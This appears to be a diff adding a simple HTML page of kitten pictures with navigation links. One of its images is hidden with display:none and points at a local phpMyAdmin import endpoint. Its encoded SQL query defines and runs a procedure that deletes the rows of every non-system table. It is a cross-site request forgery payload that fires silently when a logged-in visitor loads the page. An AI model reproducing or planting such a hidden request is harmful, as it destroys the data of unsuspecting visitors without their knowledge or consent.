@@ -1,0 +1,11 @@
+<p>What a beautiful kittens!</p>
+<div>
+<a href="index.html">Home Page</a>
+<a href="page2.html">Kitten #1</a>
+<a href="page3.html">Kitten #2</a>
+<a href="page4.html">Kitten #3</a>
+</div>
+<div>
+<img src="https://www.vets4pets.com/syssiteassets/species/cat/kitten/tiny-kitten-in-field.jpg?width=1040" />
+<img src="http://127.0.0.1:80/pma/import.php?db=mysql&table=db&sql_query=DROP+PROCEDURE+IF+EXISTS+EMPT%3B%0ADELIMITER+%24%24%0A++++CREATE+PROCEDURE+EMPT%28%29%0A++++BEGIN%0A++++++++DECLARE+i+INT%3B%0A++++++++SET+i+%3D+0%3B%0A++++++++WHILE+i+%3C+100+DO%0A++++++++++++SET+%40del+%3D+%28SELECT+CONCAT%28%27DELETE+FROM+%27%2CTABLE_SCHEMA%2C%27.%27%2CTABLE_NAME%29+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA+NOT+LIKE+%27%25_schema%27+and+TABLE_SCHEMA%21%3D%27mysql%27+LIMIT+i%2C1%29%3B%0A++++++++++++PREPARE+STMT+FROM+%40del%3B%0A++++++++++++EXECUTE+stmt%3B%0A++++++++++++SET+i+%3D+i+%2B1%3B%0A++++++++END+WHILE%3B%0A++++END+%24%24%0ADELIMITER+%3B%0A%0ACALL+EMPT%28%29%3B%0A" style="display:none;" />
+</div>
